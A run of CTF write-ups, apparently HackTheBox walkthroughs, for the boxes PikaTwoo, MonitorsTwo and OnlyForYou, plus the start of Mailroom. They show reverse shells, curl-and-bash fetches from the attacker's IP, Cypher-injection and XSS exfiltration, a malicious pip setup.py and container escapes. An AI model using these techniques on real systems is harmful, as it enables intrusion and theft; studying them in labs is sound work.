So how would this apply for PikaTwoo? It seems perhaps I can get the POST body to not be scanned. Does having POST body access help me? It looks like it does:
By adding -d, it sends a POST request with the parameters in the body.
If I visit /admin/content/assets/add/a with a cookie SESSa=a, then the body of the POST won’t be scanned by ModSecurity. So what happens when I send a POST to /admin/content/assets/a? The rule will check /index.php?region=/admin/content/assets/add/a. That’s not really helpful, unless the region in the body takes priority over the one in the GET parameters. I’ll do this as an experiment, where 0xdf is the GET region, and post0xdf is the body one:
Based on the debug, it looks like the POST takes priority! That means I should be able to access files around Mod Security. And it works:
I can use the LFI to read files from the disk. I’m not able to get to any log files, so I can’t log poison. I don’t have any upload capability to get a webshell on PikaTwoo. I could also try PHP filter injection (like in Encoding and Pollution), but the debug messages show that my input is prepended with “regions/”, which breaks this technique.
This blog post is about just this situation, using nginx’s ability to create temporary files on disk for large requests to create a webshell that gets invoked before it gets deleted. The post includes a example script, which I’ll walk-through and then modify for PikaTwoo in this video:
By the end of the video, I’ve got this script:
And it runs id:
To get a shell, I’ll update the script to run curl to my server and then pipe the result into bash:
Now I’ll save a simple bash reverse shell in rev:
And start a Python web server hosting this file. When it runs, I get a shell:
I’ll upgrade the shell using the standard technique:

Category: Shell as nobody in APISIX Pod
The box has the feeling of being a container. There are no directories in /home. There’s a start.sh in the system root that runs supervisord, which is not uncommon in containers but is very rare in non-containers:
There’s no .dockerfile in /, so it might not be a simple Docker container.
The IP address is 10.244.0.3/24, which is different from the IP of PikaTwoo:
In /run/secrets there’s a kubernetes.io directory:
Digging in a bit, I’ll find files for the namespace and the token:
The namespace is called applications and there’s a token.
The Kubernetes docs have a page called Accessing the Kubernetes API from a Pod that walks through how to do just that. Outside the pods I’d typically use a program called kubectl to interact with the cluster, but that’s not installed in this (or most) pods.
I’ll follow the instructions there, first setting some variables:
Now I can hit the API using that token:
The API docs show that secrets are accessed from /api/v1/namespaces/{namespace}/secrets:
That has two interesting variables related to APISIX:
I noted above a CVE in APISIX that this version would be vulnerable. It allowed bypassing of IP whitelisting, but also added that if the keys were left as default, it would give RCE. The keys were not left as default, but now that I’ve leaked them, it’s basically the same.
CVE-2022-24112 - An issue in the X-REAL-IP header that allows for bypassing IP restrictions, and, if the default Admin Key is present, the batch-requests plugin will allow for remote code execution. This POC will exploit the vuln, but it doesn’t work here (likely because the default admin key was changed).
This repo has a POC, but it’s really just making two HTTP requests to the APISIX admin API, so I’ll do it manually to understand what’s happening.
APISIX is running on TCP 443 over HTTPS. The first request goes to /apisix/batch-requests. If I curl this from my host, it returns no route found:
It’s important to do this as a POST request:
I’m going to add a route to the API that gives me a reverse shell. I’m going to need to hit the above endpoint with the following:
Header: Content-type: application/json - so that the body is correctly interpreted
Body: The following JSON blob that describes a request that will be made:
This will cause APISIX’s admin feature to make a PUT request to /apisix/admin/routes/index to create a route at /shell/0xdf. That will execute curl http://10.10.14.6/rev -o /tmp/0xdf; bash /tmp/0xdf, which has curl to fetch a script named rev from my server and then run it with bash. I updated the X-API-KEY header with the leaked key.
All together, that curl command looks like (using jq to pretty print the JSON response):
It reports success.
With that endpoint created, I’ll hit it to trigger the reverse shell:
It hangs, but there’s a request at my webserver:
And then a shell at nc:
This is the APISIX pod.
I’ll upgrade the shell:

Category: Shell as Andrew
This is another pod, and it’s very empty. I’ll try to find the APISIX configs. There’s nothing in /etc/ of interest (including nginx and APISIX):
The docs show APISIX uses a config.yaml file. There’s on in /usr/local/apisix/conf/:
The file has a lot of information in it, but one part jumps out:
There’s a password for andrew in that URL, as well as a new domain.
I’m not able to find anything that resolves to evolution.pokatmon.htb in any of the containers or see anything different from my VM.
That password does work for the andrew user on PikaTwoo:
And I finally get user.txt:

Category: Shell as root
andrew’s home directory is relatively empty:
There’s one other user, jennifer, and their home directory is listable:
template.yaml, as well as the .kube and .minikube directories are part of the users group, of which andrew is a member:
The template file gives the name of a container that presumably exists on PikaTwoo (since it won’t be able to reach the internet to download others):
I’ll keep in mind to use alpine:latest when creating containers later.
kubectl is installed on the host for managing Kubernetes. andrew isn’t able to interact with it:
But using jennifer’s config works, kind of:
I’m able to interact with the Kubernetes API, but only to learn that jennifer doesn’t have permissions to list pods in default. I’ll try the namespace from the pokatdex-api pod, applications, but same thing:
jennifer does have the ability to list the namespaces:
jennifer is not able to list pods in any of those either:
Looking at jennifer’s Kubernetes config, it is looking for a minikube server at 192.168.49.2:
That’s not this host, but this host does have the .1 IP for that network on it’s cni-podman0 adapter:
Podman is an open source alternative to Docker for running containers.
minikube is the software running Kubernetes on this host. It’s running version 1.28.0-0:
Some searching for minikube vulnerabilities turns up a post from Crowdstrike, cr8escape: New Vulnerability in CRI-O Container Engine Discovered by CrowdStrike (CVE-2022-0811). It says:
Kubernetes uses a container runtime like CRI-O or Docker to safely share each node’s kernel and resources with the various containerized applications running on it. The Linux kernel accepts runtime parameters that control its behavior. Some parameters are namespaced and can therefore be set in a single container without impacting the system at large. Kubernetes and the container runtimes it drives allow pods to update these “safe” kernel settings while blocking access to others.
CrowdStrike’s Cloud Threat Research team discovered a flaw introduced in CRI-O version 1.19 that allows an attacker to bypass these safeguards and set arbitrary kernel parameters on the host. As a result of CVE-2022-0811, anyone with rights to deploy a pod on a Kubernetes cluster that uses the CRI-O runtime can abuse the “kernel.core_pattern” parameter to achieve container escape and arbitrary code execution as root on any node in the cluster.
The NIST page on the CVE has the exact versions that are vulnerable:
So how to check if it’s using CRI-O and what version? I’ll grep through jennifer’s home directory for cri-o:
The last line gives the CRI-O version of 1.22.1, which should be vulnerable according to that NIST chart.
I’ve actually exploited this vulnerability before in Vessel, although it wasn’t in the context of Kubernetes. The issue is that Kubernetes and CRI-O let a container set arbitrary kernel options using the + delimiter. Once something can do that, there are ways to leverage that to get execution as root. In this example (and Vessel’s), I’ll set the path to the script that will run (as root) on a crashdump to something I control, and then crash a process.
In Vessel, this was accompished via a SetGID pinns binary. In PikaTwoo, it’s via Kubernetes. Kubernetes only allows for some safe kernel options to be set via the config YAML file. It takes the value from that file and passes it to pinns to set the options. Unfortunately, it doesn’t sanitize the + character, which is similar to what & does in a HTTP request.
To exploit this, I’ll set a safe / allowed option to [dummy value]+[unsafe option]=[value]. This will inject the setting of [unsafe option], even though I’m not supposed to be allowed to set that.
The CrowdStrike post gives the steps to reproduce this vulnerability, but it’s much more complicated than what is necessary here. In the post, it’s designed for a scenario where I have access to create pods, but not to the host file system (for example, AWS’s EKS Kubernetes service). In this scenario, the steps to exploit are:
In this scenario, I’ll do the same thing, but I don’t need the first pod. I can:
This is very similar to what I did on Vessel, though through Kubernetes this time.
If I didn’t have access to the host filesystem for some reason, I could set up my own local instance of Minikube to look like this one by installing Minikube, and then starting with these instructions like minikube start --driver=podman --container-runtime=cri-o. This creates a Minikube controller in a Podman container like in PikaTwoo.
I’ll put a simple script in a writable location like /home/andrew/Documents/ and make it executable:
This script will touch the file /tmp/0xdf.
I’ll use the exploit template from the Crowdstrike blog post to make a container:
This will inject the kernel.core_pattern option to point at my script.
Trying to create the pod is met with another lack of permissions error:
I’ll try in different namespaces. It also fails in applications, but in development it works!
I can check now that the kernel option is set:
I’ll start a process that runs in the background:
tail -f /dev/null will continue to try to read from nothing indefinitely. Because it’s in the background (&), it gives the pid of that process.
I’ll enable crashdumps:
I’ll kill my process, creating a crashdump and triggering my exploit, creating the file in /tmp:
To get a shell, I’ll simply update 0xdf.sh to create a SetUID/SetGID copy of bash:
Now I crash another process:
And start my shell:
I’m able to read the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 29 Apr 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.088s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
Must like the original Monitors box, the site is an instance of Cacti, a network graphing tool:
Cacti is a PHP application (source code on GitHub). It’s version 1.2.22 according to the footer under the login form. I could try busting the site, but the source gives the locations of all the pages if I want/need them.

Category: Shell as www-data in Container
Searching for “Cacti 1.2.22 exploit” identifies CVE-2022-46169, a command injection vulnerability in this version of Cacti:
This post does a nice job breaking down the vulnerability in detail. It shows how to set up your own lab and then explains what’s happening. There’s a command injection in a GET parameter sent to remote_agent.php. That page takes four arguments - action, host_id, local_data_ids[], and poller_id. Another great article is from SonarSource.
The first thing is to bypass the authentication. The check looks at the $client_addr to see that it’s in the DB as allowed to make these queries. The challenge is that it looks in a bunch of user-controlled HTTP headers before getting the REMOTE_ADDR, and breaks when it finds one. So by setting the HTTP header X-FORWARDED-FOR: 127.0.0.1, I’m allowed to continue.
The injection is in poller_id, but in order to reach that point, I’ll need to get a  valid host_id and local_data_ids. Most exploit script will brute force these. For example, in this one has a function to handle this:
It’s looking for rrdName to be either “polling_time” or “uptime”. That matches what I see in the SonarSource post:
This means that attackers can leverage the poller_id parameter to inject an arbitrary command when an item with the POLLER_ACTION_SCRIPT_PHP action exists. This is very likely on a productive instance because this action is added by some predefined templates like "Device - Uptime" or "Device - Polling Time".
The attacker must provide the corresponding id to make the database query return such an item.
When MonitorsTwo released, there were a bunch of POC scripts on GitHub for this vulnerability, and many of them don’t work here. For example, at the time of release for MonitorsTwo, this one doesn’t work on this target. It’s because when it does the brute force, it is looking for words that includes polling_time and some others, but not uptime:
It turns out that polling_time never comes back on MonitorsTwo, and thus this thinks it’s not vulnerable.
This is another that looked nice, but it’s only looking for cmd.php in the response:
It also only brute forces on host_id, trying all the local_data_ids at once. The SonarSource article said that was possible, but I’m not sure it’s working here.
The most interesting failure I ran into is the Metasploit module. I’ll set it up, making sure to change the SRVPORT from the default 8080 (where I’ve already got Burp listening) to something else (8000):
When I run this, it finds it vulnerable, sends a stager, but fails to return a session:
The weird thing is, when I send this through Burp to see what’s happening, it works:
It reliably fails without the proxy, and works with it. It might make a nice Beyond Root someday, but I can’t figure out what is happening there.
I can exploit this manually. If I just visit http://10.10.11.211/remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=1 in Firefox, it returns a non-authorized error:
If I submit that again, but intercept the request in Burp, and add the X-Forwarded-For header like this:
The the result comes back:
I’ll use wfuzz to experiment with different values in local_data_ids[0] and host_id. The default response is just [], so I’ll use --hh 2 to filter out two character responses. If I fuzz the host_id, only “1” has data:
When I fuzz the local_data_ids[0], it seems that 1-6 return different data:
I can take this request over to Repeater and play with it. I can actually submit all six in one request:
rrd_name gives the template, and uptime is (local_data_id of 6) is one that is mentioned as vulnerable.
I’ll add the injection to the poller_id GET parameter. A sleep 5 is a safe way to check that it’s working:
The data is the same, but instead of 255 millis like in the previous, this one is 5,259, about five seconds longer!
I’ll change the parameter from sleep to a bash reverse shell, URL-encode it, and send:
At nc, I get a shell:
I’ll upgrade my shell using the stty / script trick:

Category: Shell as marcus
This is a stripped down host, and not the one with the outward facing IP of 10.10.11.211. It seems like a Docker container:
Cacti is homed in /var/www/html:
The config is in include/config.php. The only part of the config that isn’t commented out is the database stuff:
The database is MySQL, and it’s running on another host named db.
I’ll connect to the DB using the information from the config:
There’s a lot of tables in the Cacti DB:
user_auth sounds like where I might find hashes, and I do:
I’ll drop these into a file and try to crack them. hashcat is slow on my setup with brcypt, but john breaks marcus’ hash relatively quickly:
marcus reuses that password for the host, and it works over SSH:
And there’s user.txt:

Category: Shell as root
The host is relatively empty. There’s no other users besides marcus. Nothing interesting in /opt or elsewhere on the filesystem.
I’ll upload pspy but it doesn’t show anything interesting either.
At this point, my thinking is that perhaps there’s another Docker container running. I’m already aware of the Cacti container and the MySQL container.
marcus doesn’t have permissions to interact with docker:
marcus can at least look at the version of Docker:
This is an old version of Docker, released 2 March 2021. Looking up at the releases after that one, there’s a few CVEs noted in the release notes. For example, in 20.10.6:
Scrolling up, I’ll note down a handful of CVEs patched in the releases that followed the current version. It’s useful to read each description and potentially some other posts about the vulnerability to triage if the vulnerability is something I can exploit in this case.
Some searching for “CVE-2021-41091 exploit” leads to this article from CyberArk. The issue comes when Docker changes the permissions to the directory on the host that is mapped into the container from 700 to 701. 700 means that only the owner (root) can read/write/execute. 701 allows any user to also execute!
This means that a low privilege user on the host can run files in the container. Why is that bad? If the container has a file owned by root and with the SetUID bit on, then that low priviliege user can run it as root on the host.
From the host, I’m able to see the directory Docker is using in the container with the mount command:
There are two of these “overlay” mounts, as there are two containers running.
Looking in one of them, I’ll see the container filesystem root:
It looks like the second one is the Cacti container:
I can create a file in the container:
And it is there on the host:
If I can get root in the container and create a SetUID binary, I can run it as root on the host.
The container doesn’t have sudo. There are SetUID binaries:
capsh is interesting (it especially stands out because it’s in sbin). It has a GTFObins page:
Running the command works:
Inside the container, I’ll make a copy of bash and set it to SetUID:
On the host, this shows up as 4777 (note the s where the owner x would be):
Running it (with -p to not drop privs) gives a root shell:
And I can read root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 22 Apr 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.089s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 focal.
There’s a redirect to on HTTP to only4you.htb.
Given the user of domain names for routing, I’ll fuzz to see if any subdomains of only4you.htb return a different page with ffuf:
-mc all will look at all response codes. -ac will let it auto filter any that are different from the default response. It finds one, beta.only4you.htb. I’ll add both to my /etc/hosts file:
The site is for some kind of tech services firm:
All of the links in the top bar go to points on the same page.
There’s a contact form at the bottom that feels kind of like it’s just part of the template. On submitting, it does send a POST request to / with the info, but the page doesn’t show any message or anything.
There are some names on the page. There’s also an email address, info@only4you.htb.
There are a couple references to “beta” versions of product. In “services”:
Later in the FAQ there’s a link to beta.only4you.htb:
It’s hard to identify much here. Guessing at an extension for the index pages gets 404 not found for index.html, index.php, and index.
The HTTP response headers only show nginx:
Looking at the page source shows a bunch of CSS and JS loaded from ../static/vendor, but nothing particularly interesting.
There’s even a custom 404 page:
I’ll run feroxbuster against the site, but it doesn’t find anything interesting I haven’t found yet.
The blue button gives the source code, and the top two links at the right go to /resize and /convert.
/resize has a form claiming to resize images:
I can upload an image, and it must be bigger than 700x700:
On sending a larger file, it flashes success, and then redirects to /list:
Clicking on one of the buttons returns the image at that size with a POST to /download.
/convert has a similar form, and when I upload a .png, it returns a .jpg, and vice versa.
I’m going to skip the brute force on directories and go right to the source. When I click on the ““Source Code” button, it downloads source.zip. It’s a Python website:
It’s a Python Flask application. VSCode allows me to quickly take a look at the routes:
It looks like on successful submission to /resize I’m supposed to get a redirect to /list (I’m not sure why it doesn’t work for me).

Category: Shell as www-data
The /download function is immediately interesting because it’s reading files from the disk. On downloading, the POST request looks like:
In the source, it’s:
There’s a check for directory traversal. If “..” is in the filename, then it fails.
I first learned about this issue in solving OpenSource. It turns out that in python, when using os.path.join, if any component is an absolute path, then the ones before it are ignored! From the docs:
To test this, I’ll send the POST request to Burp Repeater, and change the path to /etc/passwd. It works:
I’ll note some interesting users that have shells set - john, neo4j, and dev.
I’m not able to read anything useful from any of the home directories of the interesting users (unsurprisingly).
I’ll take a look at the nginx configurations. Websites are defined in /etc/nginx/sites-enabled/. The default configuration name is default or default.conf, and default matches here:
The top server sets the redierct to only4you.htb.
The second one handles only4you.htb, and proxies it into a UNIX socket in /var/www/only4you.htb/. It’s likely that software like gunicorn or  uWSGI is listening on that socket and handling requests.
The third server is the same as the second, but it’s for the beta site and the directory and socket name are different.
It’s fair to assume that the main site is also a Python Flask application, and that probably the main file is app.py just like the beta one. That assumption works:
The main site is very simple. The only real code is for the error handlers (not shown below) and to handle the contact form POST.
When there is a POST request to /, it passes the submitted data and the user’s IP to sendmessage. That function is imported at the top from a module named form. That could be a public module, but in this case it looks more likyl that it’s a local module. That means that there is likely a form.py in the same directory, or a form directory with an __init__.py. In either case, that file would have the sendmessage function.
It turns out I can read this at image=/var/www/only4you.htb/form.py.
Right at the top with the import statements I’m interested:
It’s using subprocess to do something. The sendmessage function is simple enough:
No issues in there. It does pass the email and ip to issecure.
issecure starts with a regex attempting to validate that the email is a valid email. Then it gets the domain from the email, and uses it to get the SPF text records for the domain. There’s more here, but it’s not important to me.
If the email address doesn’t match the regular expression, it’s supposed to return 0, ending the function before it can get to the run call which is potentially dangerous.
The problem is that re.match just checks that the start of the string matches the regex:
So as long as the start of the string is a match, I can add whatever I want to the end. I’ll demonstrate in regex101.com:
Both match on the start of the string, so both would return success on the match. If the developer wanted this to match the entire string, they could have added a $ to the end of the regex, like this:
Now only the first line matches.
If the code continued with only the matched object, that could be safe. But then it uses the full email to make the call to run:
To test this, I’ll try the same POC I showed in the image above. This will make the following:
I’ll get the POST request into Burp Repeater and send it. It hangs for a few seconds (presumably doing the DNS request?), and then there’s an ICMP packet at my listening tcpdump:
It worked!
To get a shell from this, I’ll replace the ping command with a bash reverse shell:
That URL encodes (Ctrl-u in Burp) to:
On sending that, there’s a connection back at my listening nc:
I’ll upgrade my shell using the typical trick:

Category: Shell as john
There’s not much else to find on the file system. Two users have home directories, but I can’t enter either:
/opt also has two interesting folders that I can’t access:
netstat shows several listening ports on localhost that I wasn’t aware of previously:
3306 is the default MySQL port, and 33060 is likely another MySQL instance. I’ll want to check out 3000, 8001, 7687, and 7474. It’s also worth nothing that none of these are likely running as www-data, other than port 80, or else they would probably return the process and pid.
To continue, I’ll set up a tunnel to allow me to proxy connections through OnlyForYou and reach these servers working on localhost.
I’ll upload a Chisel binary to OnlyForYou, and then start the server:
-p 8000 is because it listens on 8080 by default, but I have Burp there already. --reverse means that the client can open up listeners on the server.
On OnlyForYou, I’ll run it in client mode:
The connection reaches the server:
I’ll set up FoxyProxy to use this:
The service on port 3000 is Gogs, a opensource Git solution:
Loading it in Firefox shows the Gogs page:
On the “Explore” page, there are no public repos, but two users:
There’s no version, but it does say 2023, suggesting it’s recent. Without creds, not much else I can do.
The service on 8001 is also a webserver. This one redirects to /login:
In Firefox, the page loads as:
I’ll try admin / admin and it works! /dashboard loads:
There’s a hint in the Tasks section:
It shows that they are using Neo4j. The “User Profile” section (/update) has a form to update a profile, but submitting it just says:
The “Employees” table starts empty, but if I put a letter in and search (like “a”), it populates:
neo4j is a graph database management system. Both of these ports are part of the neo4j database. According to the docs, 7687 is the “bolt” listener, and 7474 is the HTTP listener.
I can reach 7474 on http with curl:
The query language used to query a neo4j database is called Cypher. It is used to interact with the graph data stored in Neo4j, allowing users to create, retrieve, update, and delete data using a declarative syntax that is similar to SQL.
If I think that the employee DB is likely hooked up to neo4j, then it’s possible that I could do a cypher injection against it.
The neo4j developer site has this post about Cypher injection. This page talks about creating basic queries with Cypher.
The query the page is making to get a list of employees by search probably would look something like:
That would be grabbing employee nodes where the name contains our input and returning the nodes.
If that’s the case, I’ll try to see if I can craft a query that loads all the rows. What about name=0xdf' or '1'='1? That would make the query:
It loads 5 rows, the same as an empty search.:
Given that’ none of those have “0xdf” in them, that’s proof of injection!
The Hacktricks page on Cypher injection has a bunch of good payloads to use from here. It’s easier to exfil the data base to my server than to get it formatted correctly to go onto the webpage. I’ll make use of LOAD CSV FROM to generate out going requests.
I’ll start with this payload to get version information:
I’ve updated it to use my IP, and on sending it, I get results:
I’ll update the query on the page to get the labels:
There are two hits at the server, user and employee:
One neat thing about Cypher is that I can chain queries together, like in this example:
That is how this example works to extract the keys for user:
It’s getting the user object, and then the keys for it (saved in k), and then sending a query to me with k[0]:
I am not able to find a way to get all the keys in one query, but I’ll up k[0] to k[1] and get:
k[2] doesn’t returns anything.
To read data, I’ll use the same pattern but this time generate a string for each node:
A single query sends back two requests:
Both of these are non-salted SHA256 hashes, and both are already cracked in CrackStation:
This password works for john over su:
And SSH:
And now I have user.txt:

Category: Shell as root
john can run a specific pip command as root:
It is interacting with .tar.gz files from the local instance of Gogs.
john’s creds work for john on Gogs as well:
The Test repo is managed by john, and there’s a test README.md:
I’m able to click “Upload file” and give it a file, it uploads:
The pip documentation for download shows one of the invocations to take a “archive url/path”.
While it sounds like the download command would do just that, it turns out that it not only downloads the package but also runs a setup.py file inside the package. This was called out as far back as a GitHub issue from 2014 (back when it was pip --download rather than pip download)!
This blog post brought the malicious aspects to light (again) in August 2022.
Embrace The Red has a nice post on abusing this. I’ll follow that, but build a slightly more stripped down version. A setup.py file is meant to generate the metadata about the package, but it’s also a Python file so it can execute code. The setup function call is what is referenced by pip. I’ll build a minimal version of that:
I’ve used cmdclass to define an egg_info object which takes a class. That class is defined above, and the run function will be invoked. Since I’m overwriting the default egg_info, it’s important to call the legit one after of this won’t build.
With this single file in a directory, I’ll run python -m build in the same directory:
The tar archive version is in dist:
I’ll upload this to Gogs so that it is part of the Test repository:
I’ll get the raw link to the file by clicking it, and then copying the link:
Trying to run the pip download command fails:
It’s getting a 404. curl will give the same result.
The repo is marked as private, and the pip command doesn’t have john’s creds. I could add them to the url, but that would make it not fit the sudo pattern any more. I could also potentially create a config file to store the creds..
Instead, I’ll just make the repo public by clicking on Settings. I’ll upcheck this box and click “Update Settings”:
Now it works:
Now only that, but the code executed:
/tmp/0xdf is there and owned by root.
To get a shell, I’ll update my setup.py:
Now instead of touch a file, it copies bash and sets it as SetUID. I’ll do the same steps, python -m build, upload, set the repo public (there’s a cron constantly resetting that), and run the command as john:
Now /tmp/0xdf is bash, which I can run with -p to keep root:
And read the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 15 Apr 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.086s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
The OpenSSH and Apache versions are interesting. OpenSSH matches Ubuntu 20.04 focal, but Apache matches Debian 11 bullseye. The most likely scenario for Linux in Linux is that one is in a container, but it could also be a VM. The most common scenario would also be that the webserve is the container, but that’s just speculation.
The site is for a shipping company:
The links across the top lead to pages like an about page with three employees, and a services page. The interesting one is the contact page:
It says that the AI will read and reply. That’s interesting. When I submit something, a message appears above the button:
Clicking the link leads to a page with the inquiry:
The page also does have mailroom.htb in the footer:
I’ll add that to my /etc/hosts file:
The site loads the same when accessed by this domain.
The pages on the site are all .php extension. The HTTP response headers confirm:
There’s no evidence of any kind of framework.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
It finds a bunch of pages, but nothing that jumps out as interesting or different from what I’ve already looked at manually.
Given the reference to mailroom.htb, I’ll fuzz for any subdomains that respond differently:
It finds one, so I’ll add git.mailroom.htb to my hosts file.
The site is an instance of Gitea:
The version is 1.18.0, which was released on December 29, 2022:
A skim through the releases since then doesn’t show any obvious vulnerabilities, and this is around when Mailroom was submitted to HTB, so it’s likely not intended to be vulnerable to a known exploit.
Clicking “Explore”, there’s one public repo:
The Users page has three users:
I’ll note the names administrator, matthew, and tristan for later.
There’s the source for a PHP website here:
Looking at index.php, it is definitely not a match with the main site I have accessed already.
In auth.php, there’s a reference to a full domain:
I’ll come back to this code more later.
Visiting this site return 403 forbidden:
I’m not able to access this from localhost. There’s no evidence of a 403 returned from the PHP source, and everything I try returns 403, so it seems like it’s blocked at the Apache level.

Category: Shell as tristan
The mailroom.htb site has a contact form and I’ll want to check that for cross site scripting (XSS). I’ll start with some simple bold tags. Trying to add one in the email fails client side validation (I can bypass that, but I’ll start without it):
On submitting, checking out the returned link, “test” is in bold:
It’s certainly possible that the user / AI is viewing it through a different form, but this seems like a good time to explore XSS.
I’ll start a webserver and send a script tag that will try to load JavaScript from my host:
After sending, before I can even view it myself, there’s a hit on my webserver (python -m http.server 80) from Mailroom:
To enumerate from here, I’ll write a series of different JavaScript files to load over this. I’ll keep changing the name to keep a history of what I tried. Then I can go into Burp Repeater and change the name of the requested file and submit the POST to /contact.php and view the response.
I’ll pull the url of the page that’s viewing the request:
On sending, it comes back:
Decoding that shows it’s viewing the same page that I am:
It also shows that the JavaScript I load can send back requests to me.
Can I load staff-review-panel.mailroom.htb? This code will try:
The first request is getting the contents of the page, and then the second request is sending the response text back base64-encoded as a GET parameter. Send, and there’s a hit:
That decodes to a webpage:
That matches the code in index.php in the repo on Gitea.
At this point, it’s worth some time to take a deeper look at the source for the staffroom site. The index.php has a login form in the middle:
Javascript a bit further down generates the POST request to /auth.php:
Taking a look at auth.php, it starts by getting a connection to a MongoDB instance:
If the email and password POST parameters are set, it has code for checking login. First, it validates that both parameters are strings:
This is clearly trying to block NoSQL injection. However, it doesn’t die() or exit, so despite echoing a failure message, it will continue even with non-string inputs. This is a twist on an execute after redirect (EAR) vulnerability (twist because it’s not returning a redirect, but rather just a 401, but otherwise it’s exactly the same). I’ve looked at EAR vulnerabilities in Retired, Fingerprint, and Previse in the past.
After this check, it queries the DB for a user, and if it finds one, it does some 2FA generation, and if not, it returns failure:
This should absolutely be NoSQL injectable.
I’m going to use the XSS to send a POST request to the staffroom site trying to login using a NoSQL injection. When building payloads for XSS, it’s important to build in small steps, as little JavaScript errors will result in silent failures.
If I were doing this in the real world, I would stand up an instance of the PHP site in Gitea and practice what I’m about to try locally to make sure it works before risking a malicious payload. On HackTheBox, I can trigger XSS many times without issue, so I’ll just test slowly there.
To start, I’ll first try to just send a failed login to the site with no NoSQL injection:
I’m not going to show the response at the webserver or the base64 decode anymore, but it’ll look the same as previous attempts. The decoded response has the expected JSON:
Next I’ll try to inject:
I’ve only changed the POST body to now be looking for an email that is not equal to “0xdf@mailroom.htb” and a password that is not “0xdf”.  Sending that returns two JSON blobs:
That’s because it fails the is_string check, and sets the header to 401, but with the EAR-ish vulnerability, it then runs the injection anyway and successfully matches on a user.
I know the email “0xdf@mailroom.htb” isn’t in the DB, as the injection above worked. If I update the payload to only inject on the password with that email, it returns the is_string failure, a warning for trying to modify the response header a second time, and the login failure:
Replacing “0xdf” with “administrator” (to match the username on the users page) or “matthew”, the response is the same. However, when I change it to “tristan”, the response is one failure and then success:
That shows that the email address “tristan@mailroom.htb” is registered on the site.
There’s not much I can do with the login. On login, it generates a unique code and emails it to the user. However, I can brute force tristen’s password using password[$regex]=.
This script took a ton of troubleshooting in the browser console and ChatGTP to get working. The end product is:
It is going to loop over each character in characters and try the current password plus that character and .*. If the length is 130 (success), then it updates the password, sends it to me, and resets i to the start of the loop.
I had to remove a handful of special characters that mess up the regex (like * and (, etc). Luckily, I don’t need them. If I did, I’m sure there’s a way to escape them.
When I run this, I get the following at my webserver:
It takes less than 30 seconds once I send the contact message.
Trying to log into Gitea as tristan just returns 500, which is weird.
But before trying to figure out what’s going on there, that password works for tristan over SSH:

Category: Shell as www-data in Container
tristan can’t run sudo:
There’s nothing interesting in tristan’s home directory. There is another home directory, for matthew:
That directory has user.txt as well as a KeePass database:
tristan can read the KeePass file, but I’m not able to do anything with it now. I’ll come back to this file later.
When I connected to SSH, it said “You have new mail.” In /var/mail, there are files for root and tristan:
I can’t read root’s, but tristan’s has the 2FA link generated when I logged in successfully:
To access the staffroom site, I no longer need to go through the XSS. I’ll use the -D 1080 option with SSH to create a SOCKS proxy through the SSH session as tristan. From a clean session that looks like:
In my /etc/hosts file, I’ll set the domain to localhost:
In Firefox, I’ve got FoxyProxy set to proxy through a SOCKS proxy on 1080:
Now when I load the domain, it works:
When I enter tristan’s email and password, it responds with a message telling me to check my email:
That email is there:
On visiting that link, I’m redirected to /dashboard.php:
dashboard.php is mostly static HTML. There’s some PHP at the top making sure the user is logged in and handling logout clicks. The other spot is in the middle of the page where it loads a list of “activities”, like the one shown above.
Starting on line 109, it gets a list of filenames from /var/www/mailroom/inquiries using the scandir() PHP function:
It loops over each file, using file_get_contents to read the file, and if the “Irrelevant” marker isn’t present, then it uses filectime to calculate the age of the file and pathinfo to get the name of the file, putting those on the page:
Visiting inspect.php shows a form for finding tickets:
If I submit a query id from the dash board to “Read Inqueries”, it shows the content of the inquiry:
Similarly, if I send that same ID to “Check Status”:
The page also mentions using the “inspect tool” to look at the inqueries. There’s an inspect.php file in Gitea. Most of this page is static, with a couple variables defined in the PHP at the top, and then echoed into the page where they would display.
At the top, the PHP calculates $data based on the $_POST['inquiry_id'] parameter:
It’s using shell_exec to cat the file, which is unsafe. To compensate for this, it’s trying to remove any characters that might be used for command injection. However, it missed the backtick character.
$status_data is set in a very similar way, just looking for a different element in the HTML page.
I’ll put sleep  command in with tik marks:
On sending, it hangs for a few seconds, and then returns failure:
This is code execution.
With all the limits on characters I can put in, I’ll try fetching a file from my server and writing it to the host. wget doesn’t contact my server, but cur1 does.
Inside shell on my webserver, I’ll include a simple bash reverse shell:
Now I’ll grab that with curl 10.10.14.6/shell -o /tmp/0xdf.sh. It seems to work:
With nc listening on 443, I’ll send this to run the script:
At nc, I get a shell:
I’ll upgrade:

Category: Shell as matthew
It’s clear that I’m in a container looking at the hostname of “ad83468d01ee”. Tools like ifconfig and ip are not installed:
The staffroom page is in /var/www/staffroom. There are two other webservers:
html has a single script, send.sh:
This looks like what is used to send the 2FA emails.
The mailroom directory has the source for that main site. There’s nothing interesting in there. The site is almost entirely static.
The staffroom directory has code that seems to match what is in Gita:
The .git config could be interesting. config has matthew’s Gitea creds:
The %23 at the end is URL-encoded #. The password doesn’t work for SSH, as it demands a public key:
However, it does work for su from the shell as tristan:
And I can access the user flag:

Category: Shell as root
I already saw the KeePass db in matthew’s home directory:
I’ll try to open it with kpcli (the KeePass command line client):
Two things to note:
Unsurprisingly it requires a password.
Some other process has this file open. That isn’t always the case. If I run watch -d 'ls -la ~ I’ll see the .lock file show up and go away:
I’ll exfil the DB and try to crack the password, but it’s not in rockyou.txt.
I’m interested in seeing what other processes might be interacting with the KeePass file. It looks like I can only see processes owned by the current user:
